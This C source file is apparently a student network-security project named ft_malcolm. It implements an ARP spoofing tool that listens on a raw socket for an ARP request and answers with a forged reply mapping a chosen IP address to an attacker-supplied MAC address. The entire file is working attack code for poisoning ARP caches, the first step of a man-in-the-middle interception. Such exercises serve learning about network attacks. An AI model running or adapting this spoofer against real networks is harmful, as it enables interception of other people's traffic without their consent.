#include "ft_malcolm.h"

int g_stop = 0;

void handler(int sig)
{
	printf("\nSignal reçu\n");
	g_stop = 1;
	(void) sig;
}

char *if_idxtoname(int index)
{
	struct ifaddrs *ifaddr, *ifbase;
	char *name;

	if (getifaddrs(&ifaddr) == -1)
	{
		printf("getifaddrs : %s\n", strerror(errno));
		return NULL;
	}

	ifbase = ifaddr;

	while (ifaddr)
	{
		if (if_nametoindex(ifaddr->ifa_name) == (unsigned int)index)
		{
			name = ft_strdup(ifaddr->ifa_name);
			freeifaddrs(ifbase);
			return (name);
		}
		ifaddr = ifaddr->ifa_next;
	}
	freeifaddrs(ifbase);
	return NULL;
}

int hex_to_dec(char c)
{
	char hex_maj[17] = "0123456789ABCDEF";
	char hex_min[17] = "0123456789abcdef";
	for (int i=0; i < 16; i++)
	{
		if (c == hex_maj[i] || c == hex_min[i])
			return (i);
	}
	return (-1);
}

void free_tab(char **tab)
{
	int i = 0;
	while(tab[i])
	{
		free(tab[i]);
		i++;
	}
	free(tab);
}

int convert_mac(char *mac_str, unsigned char *mac_tab)
{
	char **mac_split;
	int convert;
	int res;
	mac_split = ft_split(mac_str, ':');
	for (int i=0; mac_split[i]; i++)
	{
		if (i > 5)
			return (0);
		res = 0;
		for (int j=0; mac_split[i][j]; j++)
		{
			if (j > 1)
			{
				free_tab(mac_split);
				return (0);
			}
			convert = hex_to_dec(mac_split[i][j]);
			if (convert == -1)
			{
				free_tab(mac_split);
				return (0);
			}
			res  = res * 16 + convert;
		}
		mac_tab[i] = res;
	}
	free_tab(mac_split);
	return (1);
}

int check_args(int argc, char **argv, unsigned char *source_mac, unsigned char *target_mac, struct in_addr *target_ip, struct in_addr *source_ip)
{
	if (argc != 5)
	{
			fprintf(stderr, "Wrong arugments\n");
			return 1;
	}
	if (getuid() != 0)
	{
    	fprintf(stderr, "Vous devez être root pour exécuter ce programme\n");
    	return 1;
	}
	if(inet_pton(AF_INET, argv[1], source_ip) != 1)
	{
		fprintf(stderr,"ft_malcolm: unknown host or invalid IP address: %s \n", argv[1]);
		return (1);
	}
	if (convert_mac(argv[2], source_mac) != 1)
	{
		fprintf(stderr,"ft_malcolm: invalid mac address: %s \n", argv[2]);
		return (1);	
	}
	if(inet_pton(AF_INET, argv[3], target_ip) != 1)
	{
		fprintf(stderr,"ft_malcolm: unknown host or invalid IP address: %s \n", argv[3]);
		return (1);
	}
	if (convert_mac(argv[4], target_mac) != 1)
	{
		fprintf(stderr,"ft_malcolm: invalid mac address: %s \n", argv[4]);
		return (1);	
	}
	return (0);
}

void fill_arp_reply(unsigned char *buffer, unsigned char *target_mac, unsigned char *source_mac, struct in_addr target_ip, struct in_addr source_ip)
{
	ft_memcpy(buffer, target_mac, 6);
	ft_memcpy(&buffer[6], source_mac, 6);
	ft_memcpy(&buffer[22],&source_mac[0], 6);
	ft_memcpy(&buffer[28], &(source_ip.s_addr), 4);
	ft_memcpy(&buffer[32], &target_mac[0], 6);
	ft_memcpy(&buffer[38], &(target_ip.s_addr), 4);
}

int main(int argc, char **argv)
{
	signal(SIGINT, handler);

	unsigned char buffer[1518];
	struct sockaddr_ll addr;
	socklen_t addr_len = sizeof(addr);
	struct in_addr target_ip, source_ip;
	unsigned char target_mac[6];
	unsigned char source_mac[6];

	if (check_args(argc, argv, source_mac, target_mac, &target_ip, &source_ip) == 1)
		return (1);
	int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (sock < 0)
		fprintf( stderr, "socket : %s\n", strerror(errno));
	//struct timeval tv;
	//tv.tv_sec = 1;
	//tv.tv_usec = 0;
		//setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
	printf("	mac address target_mac: %02X:%02X:%02X:%02X:%02X:%02X\n", target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5]);
	printf("	IP address target_ip: %d.%d.%d.%d\n", 
       ((unsigned char *)&target_ip.s_addr)[0],
       ((unsigned char *)&target_ip.s_addr)[1],
       ((unsigned char *)&target_ip.s_addr)[2],
       ((unsigned char *)&target_ip.s_addr)[3]);
	while (!g_stop)
	{
		int b = recvfrom(sock, buffer, 1518, 0, (struct sockaddr *)&addr, &addr_len);
		if (b > 0)
		{
			if (buffer[12] == 8 && buffer[13] == 6)
			{
				char *name = if_idxtoname(addr.sll_ifindex);
				printf("Found available interface: %s\n", name);
				printf("An ARP request has been broadcast.\n");
				printf("	mac address of request: %02X:%02X:%02X:%02X:%02X:%02X\n", buffer[6], buffer[7],buffer[8],buffer[9],buffer[10],buffer[11]);
				printf("	IP address of request: %d:%d:%d:%d\n", buffer[28], buffer[29], buffer[30],  buffer[31]);
				fill_arp_reply(buffer, target_mac, source_mac, target_ip, source_ip);
				sendto(sock, buffer, 42, 0, (struct sockaddr *)&addr, addr_len);
				free(name);
				close(sock);
				return 0;
			}
		}
	}
	close(sock);
}
